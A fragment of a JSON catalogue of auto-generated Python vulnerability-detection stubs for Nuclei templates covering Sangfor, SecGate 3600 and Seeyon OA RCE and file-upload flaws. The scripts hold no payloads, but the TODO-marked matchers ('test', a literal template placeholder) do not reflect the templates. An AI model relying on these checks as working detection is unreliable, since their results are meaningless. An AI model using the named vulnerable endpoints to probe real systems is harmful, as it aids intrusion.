        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sangfor-login-rce\nName: Sangfor Application Login - Remote Command Execution\nSeverity: critical\nDescription: Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sangfor_login_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sangfor-login-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Sangfor Application Login - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; regex(\"uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)\", body)'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Sangfor Application Login - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sangfor_login_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sangfor",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_secgate_3600_file_upload",
        "name": "SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{md5(string)}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "file-upload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: file-upload",
            "default": "{{rand_base(5)}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "secgate-3600-file-upload"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: secgate-3600-file-upload\nName: SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_secgate_3600_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"secgate-3600-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_secgate_3600_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: secgate-3600-file-upload\nName: SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_secgate_3600_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"secgate-3600-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_secgate_3600_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "secgate",
          "3600",
          "firewall",
          "file-upload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_seeyon_oa_fastjson_rce",
        "name": "Seeyon OA Fastjson Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Seeyon OA Fastjson is vulnerable to RCE.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | mot(s) 'com.alibaba.fastjson.JSONException'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: seeyon-oa-fastjson-rce\nName: Seeyon OA Fastjson Remote Code Execution\nSeverity: critical\nDescription: Seeyon OA Fastjson is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_seeyon_oa_fastjson_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"seeyon-oa-fastjson-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Seeyon OA Fastjson Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | mot(s) 'com.alibaba.fastjson.JSONException'\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', 'com.alibaba.fastjson.JSONException']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Seeyon OA Fastjson Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_seeyon_oa_fastjson_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: seeyon-oa-fastjson-rce\nName: Seeyon OA Fastjson Remote Code Execution\nSeverity: critical\nDescription: Seeyon OA Fastjson is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_seeyon_oa_fastjson_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"seeyon-oa-fastjson-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Seeyon OA Fastjson Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | mot(s) 'com.alibaba.fastjson.JSONException'\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', 'com.alibaba.fastjson.JSONException']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Seeyon OA Fastjson Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_seeyon_oa_fastjson_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "seeyon",
          "oa",
          "rce",
          "fastjson",
          "oast",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_seeyon_oa_sp2_file_upload",
        "name": "Seeyon OA wpsAssistServlet - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet interface. Through the vulnerability, an attacker can send a specific request packet to upload malicious files and obtain server permissions.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"success\":' | mot(s) '{{string}}' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{rand_base(5)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
